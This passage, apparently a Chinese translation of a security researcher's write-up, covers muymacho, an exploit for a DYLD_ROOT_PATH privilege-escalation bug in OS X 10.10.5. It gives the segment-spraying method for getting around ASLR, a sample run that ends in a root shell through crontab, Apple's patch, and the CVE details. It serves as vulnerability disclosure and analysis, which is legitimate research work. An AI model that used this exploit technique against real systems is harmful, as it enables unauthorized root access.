1.  我们的目标是覆盖dyld_target，该页是dyld中包含mmap系统调用的那一页。
2.  我们使用32个segment覆盖0x20000000 bytes来绕过ASLR。
    *   我们使用由高至低的策略
    *   第一个segment的vmaddr是0x7ffe6ec1d000
    *   后面的segment拥有更小（0x1000000）vmaddr
3.  所有segment指向payload同样的4096个页
    *   所有页在偏移0xdc6处都是jmp rax指令
    *   基础页里面包含我们的shellcode

muymacho是由python编写，在github发布。在MachoFile和LC_SEGMENT_64类中进行了最小限度的Mach-O实现。创建了一个dyld_sim文件，包含32个segment。所有都指向payload。

muymacho使用时，输入一个基目录路径，会自动生成需要的目录结构和dyld_sim文件。实际的利用需要设置DYLD_ROOT_PATH到一个目录，并执行一个suid的二进制文件。下面是一个运行的例子。

```
user@yosemite:~/tmp$ python muymacho.py ~/tmp
muymacho.py - exploit for DYLD_ROOT_PATH vuln in OS X 10.10.5
Luis Miras @_luism    

[+] using base_directory: /Users/user/tmp
[+] creating dir: /Users/user/tmp/usr/lib
[+] creating macho file: /Users/user/tmp/usr/lib/dyld_sim    LC_SEGMENT_64: segment 0x00    vm_addr: 0x7ffe6ec1d000    LC_SEGMENT_64: segment 0x01    vm_addr: 0x7ffe6dc1d000    LC_SEGMENT_64: segment 0x02    vm_addr: 0x7ffe6cc1d000    LC_SEGMENT_64: segment 0x03    vm_addr: 0x7ffe6bc1d000    LC_SEGMENT_64: segment 0x04    vm_addr: 0x7ffe6ac1d000    LC_SEGMENT_64: segment 0x05    vm_addr: 0x7ffe69c1d000    LC_SEGMENT_64: segment 0x06    vm_addr: 0x7ffe68c1d000    LC_SEGMENT_64: segment 0x07    vm_addr: 0x7ffe67c1d000    LC_SEGMENT_64: segment 0x08    vm_addr: 0x7ffe66c1d000    LC_SEGMENT_64: segment 0x09    vm_addr: 0x7ffe65c1d000    LC_SEGMENT_64: segment 0x0a    vm_addr: 0x7ffe64c1d000    LC_SEGMENT_64: segment 0x0b    vm_addr: 0x7ffe63c1d000    LC_SEGMENT_64: segment 0x0c    vm_addr: 0x7ffe62c1d000    LC_SEGMENT_64: segment 0x0d    vm_addr: 0x7ffe61c1d000    LC_SEGMENT_64: segment 0x0e    vm_addr: 0x7ffe60c1d000    LC_SEGMENT_64: segment 0x0f    vm_addr: 0x7ffe5fc1d000    LC_SEGMENT_64: segment 0x10    vm_addr: 0x7ffe5ec1d000    LC_SEGMENT_64: segment 0x11    vm_addr: 0x7ffe5dc1d000    LC_SEGMENT_64: segment 0x12    vm_addr: 0x7ffe5cc1d000    LC_SEGMENT_64: segment 0x13    vm_addr: 0x7ffe5bc1d000    LC_SEGMENT_64: segment 0x14    vm_addr: 0x7ffe5ac1d000    LC_SEGMENT_64: segment 0x15    vm_addr: 0x7ffe59c1d000    LC_SEGMENT_64: segment 0x16    vm_addr: 0x7ffe58c1d000    LC_SEGMENT_64: segment 0x17    vm_addr: 0x7ffe57c1d000    LC_SEGMENT_64: segment 0x18    vm_addr: 0x7ffe56c1d000    LC_SEGMENT_64: segment 0x19    vm_addr: 0x7ffe55c1d000    LC_SEGMENT_64: segment 0x1a    vm_addr: 0x7ffe54c1d000    LC_SEGMENT_64: segment 0x1b    vm_addr: 0x7ffe53c1d000    LC_SEGMENT_64: segment 0x1c    vm_addr: 0x7ffe52c1d000    LC_SEGMENT_64: segment 0x1d    vm_addr: 0x7ffe51c1d000    LC_SEGMENT_64: segment 0x1e    vm_addr: 0x7ffe50c1d000    LC_SEGMENT_64: segment 0x1f    vm_addr: 0x7ffe4fc1d000
[+] building payload
[+] dyld_sim successfully created
To exploit enter:  DYLD_ROOT_PATH=/Users/user/tmp crontab
user@yosemite:~/tmp$ DYLD_ROOT_PATH=/Users/user/tmp crontab
bash-3.2#

```

0x0A 补丁
=====

EI Capitan对dyld做了很多修改。特别是对dyld_siｍ文件验证更加严格，修补了muymacho使用的漏洞。几种不同的检查保证了连续的segment都拥有正常的fileoff和vmaddr值。

在本文写作时，苹果还没有发布EI Capitan的源代码。但是一些修改可以通过IDA pro来查看。

0x0B 总结
=====

本节总结了本文的大部分内容。我们已经讨论漏洞的发现，问题分析，直到利用。完整的利用程序分享在[github](https://github.com/luismiras/muymacho)。

我希望本文能够对你有用。这是个有趣的bug，我非常享受编写muymacho的过程。

谢谢所有修订本文的人（Pete Markowsky, Ian Melven, Josha Bronson）。同时谢谢[@i0n1c](https://twitter.com/i0n1c)发布的挑战，是它导致本漏洞的发现。

调试shellcode
-----------

有时候我很好奇到底是哪一个segment在利用执行的过程中起到了作用，面对不同的ASLR地址。实际上，真实的地址也不是那么重要。但我还是加入了一段debug shellcode来将信息返回给用户。

debug shellcode通过“-d”参数来开启。在muymacho返回‘#’符号后，输入

```
echo "$MUYMACHO"

```

![](http://drops.javaweb.org/uploads/images/89a2e80531c72e74cb64dbef5a169e7957f6181b.jpg)

可以随意的看看muymacho的调试debug shellcode。调试信息是通过execve调用一个环境变量来传递的。

0x0C 附录
=====

10.10.4及更早
----------

Mac OS X 10.10.4和之前版本就已经添加了DYLD_ROOT_PATH变量。本节讨论一下这个老版本的变量和10.10.5的更新。OS X 10.10.4使用[dyld-353.2.1](http://opensource.apple.com/source/dyld/dyld-353.2.1/)里的[dyld.cpp](http://opensource.apple.com/source/dyld/dyld-353.2.1/src/dyld.cpp)。

在早前的`useSimulatorDyld()`函数中，有一个检查dyld_sim是否被root所有拥有。

```
// verify simulator dyld file is owned by root
   struct stat sb;
   if ( fstat(fd, &sb) == -1 )
      return 0;
   if ( sb.st_uid != 0 )
      return 0;

```

通过对代码段的查看，发现代码签名的要求是可选的。所以唯一的要求就是一个被root用户拥有的，没有签名都行的dyld_sim文件，这当然不会形成阻碍。`useSimulatorDyld()`将会加载和执行这样的文件。

10.10.5更新
---------

10.10.5更新修补了DYLD_PRINT_FILE漏洞（CVE-2015-3760）。可能由于这个变量漏洞被发现的原因，同时也对useSimulatorDyld()函数进行了修改。

dyld_sim不需要再被root拥有，但是代码签名变为了强制要求。下面是[dyld.cpp](https://opensource.apple.com/source/dyld/dyld-353.2.3/src/dyld.cpp)的部分代码。

```
int result = fcntl(fd, F_ADDFILESIGS_FOR_DYLD_SIM, &siginfo);
   if ( result == -1 ) {
      dyld::log("fcntl(F_ADDFILESIGS_FOR_DYLD_SIM) failed with errno=%d\n", errno);
      return 0;
   }

```

一个新的fcntl命令被加入到10.10.5，针对dyld_sim。下面的代码来自`/usr/include/sys/fcntl.h`。

```
#define F_ADDFILESIGS_FOR_DYLD_SIM 83   /* Add signature from same file, only if it is signed by Apple (used by dyld for simulator) */    

```

dyld_sim需要一个苹果的数字签名，仅仅一个开发者证书是不够的。（译者注：由于在数字签名之前就取得了控制权，所以不会进行验证就到shellcode了）

0x0D CVE号
=====

关于本漏洞的CVE号是这样的，[EI Capitan](https://support.apple.com/en-us/HT205267)安全升级列表列出了以下bug信息。授予了[beist](https://twitter.com/beist)：

> **Dev Tools**
> 
> **Available for**: Mac OS X v10.6.8 and later
> 
> **Impact**: A malicious application may be able to execute arbitrary code with system privileges
> 
> **Description**: A memory corruption issue existed in dyld. This was addressed through improved memory handling.
> 
> **CVE-ID**
> 
> **CVE-2015-5876**: beist of grayhash

同样的CVE也被列入了[iOS 9](https://support.apple.com/en-us/HT205212)和[watchOS 2](https://support.apple.com/en-us/HT205213)的升级信息中。对iOS 8.4.1中的dyld进行了一个粗略的检查，没有发现和muymacho一样的漏洞。也许是我搞错了，如果有我会更新到本文。